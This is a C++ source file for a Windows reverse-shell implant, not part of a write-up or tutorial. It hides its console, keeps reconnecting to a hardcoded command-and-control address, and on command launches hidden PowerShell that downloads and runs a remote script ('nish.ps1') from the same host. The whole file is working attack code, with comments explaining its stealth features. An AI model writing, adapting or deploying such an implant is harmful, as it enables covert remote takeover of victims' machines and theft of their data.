
#include <stdio.h>
#include <iostream>
#include <winsock2.h> //Windows socket communication over TCP/IP.
#include <windows.h>  //Calling other processes,  initiating calls and heathers.
#include <ws2tcpip.h> //Windows socket communication over TCP/IP.
#pragma comment(lib,"Ws2_32.lib") //Tell the compiler to statically compile the library inside the binary, without this our binary won't execute in machines unless they have Visual C/C++ installed.
#define DEFAULT_BUFLEN 1024  //Set the buffer length of our socket 'recv' and 'send' functions, giving a const size of 1024 bytes.
using namespace std;




// Shell 

void RunShell(char* C2Server, int C2Port) {

	//Sleep 5 seconds and keep trying to reconnect to us, in case the connection drops.
	while (true) {
		Sleep(5000);

		SOCKET mySocket;
		sockaddr_in addr;
		WSADATA version;
		WSAStartup(MAKEWORD(2, 2), &version);
		mySocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
		addr.sin_family = AF_INET;


		addr.sin_addr.s_addr = inet_addr(C2Server);
		addr.sin_port = htons(C2Port);

        // Try to connect, if socket error, close sockets and repeat while
        if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {

			closesocket(mySocket);
			WSACleanup();
			continue;

		}
        // If connect to socket OK... Exec
        else {

			// Send hostname ( hardcoded by now)
			const char *sendbuf = "W10 - tr3mb0";
			char RecvData[DEFAULT_BUFLEN];
			send(mySocket, sendbuf, (int) strlen(sendbuf), 0);

			// Receive command of bringing up shell
			memset(RecvData, 0, sizeof(RecvData));
			int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);

			if (RecvCode > 0) {
				system("start powershell.exe -WindowStyle Hidden IEX(New-Object Net.WebClient).downloadString('http://192.168.1.53:9090/nish.ps1')");
				continue;

			}

			if (RecvCode <= 0) { 
				closesocket(mySocket);
				WSACleanup;
				continue;
			}
			//If the input is exit, the socket will be exited, else, the programm will continue the while loop.
			if (strcmp(RecvData, "exit\n") == 0) {
				exit(0);
			}
			

		}



	}

}

// MAIN FUNC

int main(int argc, char **argv) {

	FreeConsole(); //Disable console, so it is not visible, and won't pop up.

	//If argc receives 3 arguments, the 2º will be the ip and the 3º port, if it doesnt receive any arguments, it will use the hardcoded one. After that, forward the data into RunShell function.
	if (argc == 3) {
		int port = atoi(argv[2]);
		RunShell(argv[1], port);
	}
	else {
		char host[] = "192.168.1.53";
		int port = 443;
		RunShell(host, port);
	}
	return 0;

}

